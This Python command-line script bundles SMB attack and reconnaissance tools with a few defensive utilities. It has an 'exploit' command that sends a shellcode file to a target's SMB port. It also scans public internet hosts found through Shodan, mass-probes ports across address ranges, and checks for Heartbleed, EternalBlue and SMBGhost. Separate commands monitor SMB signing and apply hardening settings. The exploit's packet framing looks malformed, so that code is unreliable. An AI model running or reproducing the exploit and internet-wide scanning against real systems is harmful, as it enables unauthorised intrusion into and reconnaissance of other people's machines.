#!/usr/bin/env python3
# ultimate_flow.py
import argparse, logging, struct, socket, os, time, subprocess, requests, json, ipaddress, concurrent.futures, ssl, platform, select
from itertools import product
from typing import Tuple, List, Dict

# ---------------- Threat PoC (unchanged) ----------------
NEGOTIATE = (
    b"\x00\x00\x00\x90" b"\xfeSMB" b"\x40\x00\x00\x00" + b"\x00"*8 +
    b"\x00\x00" + b"\x00\x00" + b"\x00"*8 + b"\x24\x00" + b"\x00\x00" +
    b"\x00\x00\x00\x00" + b"\x00"*64
)

def exploit(host: str, port: int, payload: str) -> None:
    sock = socket.create_connection((host, port))
    sock.sendall(NEGOTIATE)
    sock.recv(1024)
    shell = open(payload, 'rb').read()
    pkt = b"\x00\x00\x00" + struct.pack(">B", len(shell)) + shell
    sock.sendall(pkt)
    sock.close()
    logging.info("payload sent")

# ---------------- Threat-model probe (unchanged) ----------------
def probe_smb(host: str, port: int) -> Tuple[int, bool]:
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(remoteName=host, remoteHost=host, sess_port=port)
    smb.login('', '')
    d, s = smb.getDialect(), smb.isSigningRequired()
    smb.close()
    return d, s

# ---------------- Persistent signing monitor ----------------
REG = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
def monitor_signing(interval: int) -> None:
    while True:
        try:
            out = subprocess.check_output(
                ["reg", "query", REG, "/v", "RequireSecuritySignature"],
                stderr=subprocess.DEVNULL, text=True
            )
            if "0x0" in out:
                logging.warning("SMB signing disabled")
            else:
                logging.info("SMB signing enforced")
        except Exception as e:
            logging.error(e)
        time.sleep(interval)

# ---------------- Hardening patch (unchanged) ----------------
PATCH = r"""
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Type DWord -Value 1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EncryptData $true -RejectUnencryptedAccess $true -Force
Restart-Service -Name lanmanserver
Write-Output "SMB hardening applied"
"""
def apply_patch() -> None:
    subprocess.check_call(["powershell", "-NoLogo", "-NonInteractive", "-Command", PATCH])

# ---------------- Firewall probe ----------------
def firewall_probe(host: str, port: int, timeout: int = 3) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

# ---------------- Public internet scan ----------------
SHODAN_URL = "https://api.shodan.io/shodan/host/search"
def internet_scan(query: str, limit: int) -> List[str]:
    key = os.getenv("SHODAN_API_KEY")
    if not key:
        raise RuntimeError("SHODAN_API_KEY not set")
    r = requests.get(SHODAN_URL, params={"key": key, "query": query, "limit": limit})
    r.raise_for_status()
    return [m["ip_str"] for m in r.json().get("matches", [])]

def public_flow(query: str, limit: int, port: int, timeout: int) -> None:
    for ip in internet_scan(query, limit):
        if not firewall_probe(ip, port, timeout):
            logging.info("%s port %d filtered", ip, port)
            continue
        try:
            d, s = probe_smb(ip, port)
            logging.info("%s SMB%d signing %s", ip, d, "required" if s else "disabled")
        except Exception as e:
            logging.error("%s %s", ip, e)

# ---------------- Directed-graph firewall test ----------------
def expand_hosts(target: str) -> List[str]:
    if '/' in target:
        return [str(h) for h in ipaddress.ip_network(target, strict=False).hosts()]
    if os.path.isfile(target):
        return [l.strip() for l in open(target) if l.strip()]
    return [h.strip() for h in target.split(',') if h.strip()]

def param_space_firewall_test(hosts: List[str], ports: List[int], timeouts: List[int], workers: int
                             ) -> List[Tuple[str, int, int, bool]]:
    params = list(product(hosts, ports, timeouts))
    def task(arg):
        h, p, t = arg
        return h, p, t, firewall_probe(h, p, t)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        return list(ex.map(task, params))

def to_dot(results: List[Tuple[str, int, int, bool]]) -> str:
    lines = ["digraph {", "rankdir=LR;"]
    for h, p, t, ok in results:
        color = "green" if ok else "red"
        lines.append(f"\"{h}:{p}/{t}\" [shape=box,color={color}];")
    for h, p, t, ok in results:
        lines.append(f"source -> \"{h}:{p}/{t}\";")
    lines.append("}")
    return '\n'.join(lines)

def graph_flow(targets: str, ports_s: str, timeouts_s: str, workers: int, dot_out: str) -> None:
    hosts  = expand_hosts(targets)
    ports  = [int(p) for p in ports_s.split(',') if p]
    touts  = [int(t) for t in timeouts_s.split(',') if t]
    res    = param_space_firewall_test(hosts, ports, touts, workers)
    l      = [r for r in res if r[3]]
    print(json.dumps(l, indent=2))
    if dot_out:
        open(dot_out, 'w').write(to_dot(res))
        logging.info("graph written to %s", dot_out)

# ---------------- CVE checks ----------------
def assess_smb_cves(dialect: int, signing: bool) -> List[str]:
    r = []
    if dialect == 1:
        r.append("CVE-2017-0144(EternalBlue)")
    if dialect == 3 and not signing:
        r.append("CVE-2020-0796(SMBGhost)")
    return r

def heartbleed_check(host: str, port: int, timeout: int) -> bool:
    hello  = bytes.fromhex("16 03 02 00  dc 01 00 00 d8 03 02 53 43 5b 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
    hb_req = bytes.fromhex("18 03 02 00 03 01 40 00")
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(hello)
        _ = s.recv(4096)
        s.sendall(hb_req)
        ready = select.select([s], [], [], timeout)[0]
        if ready:
            data = s.recv(4096)
            s.close()
            return len(data) > 7
        s.close()
    except Exception:
        pass
    return False

# ---------------- Comprehensive single-IP access tests ----------------
def icmp_ping(host: str, timeout: int) -> bool:
    if platform.system().lower() == 'windows':
        cmd = ["ping", "-n", "1", "-w", str(timeout*1000), host]
    else:
        cmd = ["ping", "-c", "1", "-W", str(timeout), host]
    return subprocess.call(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL) == 0

def tcp_connect(host: str, port: int, timeout: int) -> bool:
    return firewall_probe(host, port, timeout)

def udp_probe(host: str, port: int, timeout: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b'', (host, port))
        sock.recvfrom(1024)
        sock.close()
        return True
    except Exception:
        return False

def http_probe(host: str, port: int, timeout: int) -> Dict[str, str]:
    try:
        url = f"http://{host}:{port}"
        r = requests.get(url, timeout=timeout)
        return {"code": str(r.status_code), "server": r.headers.get("Server","")}
    except Exception as e:
        return {"error": str(e)}

def https_probe(host: str, port: int, timeout: int) -> Dict[str, str]:
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            cert = s.getpeercert()
        return {"issuer": cert.get("issuer"), "subject": cert.get("subject")}
    except Exception as e:
        return {"error": str(e)}

def comprehensive_test(host: str, tcp_ports: List[int], udp_ports: List[int],
                       timeout: int) -> Dict[str, object]:
    res = {"icmp": icmp_ping(host, timeout), "tcp": {}, "udp": {}, "http": {},
           "https": {}, "cve": []}
    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
        futs = {ex.submit(tcp_connect, host, p, timeout): p for p in tcp_ports}
        for f in concurrent.futures.as_completed(futs):
            p = futs[f]
            res["tcp"][p] = f.result()
    for p in udp_ports:
        res["udp"][p] = udp_probe(host, p, timeout)
    for p in tcp_ports:
        if p in (80, 8080):
            res["http"][p] = http_probe(host, p, timeout)
        if p == 443:
            res["https"][p] = https_probe(host, p, timeout)
            if heartbleed_check(host, p, timeout):
                res["cve"].append("CVE-2014-0160(Heartbleed)")
        if p == 445:
            try:
                d, sgn = probe_smb(host, p)
                v = assess_smb_cves(d, sgn)
                res["cve"].extend(v)
            except Exception:
                pass
    res["cve"] = list(set(res["cve"]))
    return res

# ---------------- CLI dispatcher ------------------------
def main() -> None:
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("probe")
    p1.add_argument("--host", required=True)
    p1.add_argument("--port", type=int, default=445)

    p2 = sub.add_parser("exploit")
    p2.add_argument("--host", required=True)
    p2.add_argument("--port", type=int, default=445)
    p2.add_argument("--payload", default="shell.bin")

    p3 = sub.add_parser("monitor")
    p3.add_argument("--interval", type=int, default=300)

    sub.add_parser("patch")

    p4 = sub.add_parser("public")
    p4.add_argument("--query", default="port:445 product:Microsoft-SMB")
    p4.add_argument("--limit", type=int, default=50)
    p4.add_argument("--port", type=int, default=445)
    p4.add_argument("--timeout", type=int, default=3)

    p5 = sub.add_parser("autotest")
    p5.add_argument("--targets", required=True)
    p5.add_argument("--ports", default="445,139")
    p5.add_argument("--timeouts", default="1,3,5")
    p5.add_argument("--workers", type=int, default=256)
    p5.add_argument("--dot-out", default="")

    p6 = sub.add_parser("access")
    p6.add_argument("--host", required=True)
    p6.add_argument("--tcp-ports", default="80,443,22,25,53,8080,445")
    p6.add_argument("--udp-ports", default="53")
    p6.add_argument("--timeout", type=int, default=2)
    p6.add_argument("--json", action='store_true')

    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")

    if args.cmd == "probe":
        d, s = probe_smb(args.host, args.port)
        print(f"Dialect SMB{d}, signing {'required' if s else 'disabled'}")
    elif args.cmd == "exploit":
        exploit(args.host, args.port, args.payload)
    elif args.cmd == "monitor":
        monitor_signing(args.interval)
    elif args.cmd == "patch":
        apply_patch()
    elif args.cmd == "public":
        public_flow(args.query, args.limit, args.port, args.timeout)
    elif args.cmd == "autotest":
        graph_flow(args.targets, args.ports, args.timeouts,
                   args.workers, args.dot_out)
    elif args.cmd == "access":
        tcp_ports = [int(p) for p in args.tcp_ports.split(',') if p]
        udp_ports = [int(p) for p in args.udp_ports.split(',') if p]
        res = comprehensive_test(args.host, tcp_ports, udp_ports, args.timeout)
        if args.json:
            print(json.dumps(res, indent=2))
        else:
            print(res)

if __name__ == "__main__":
    main()
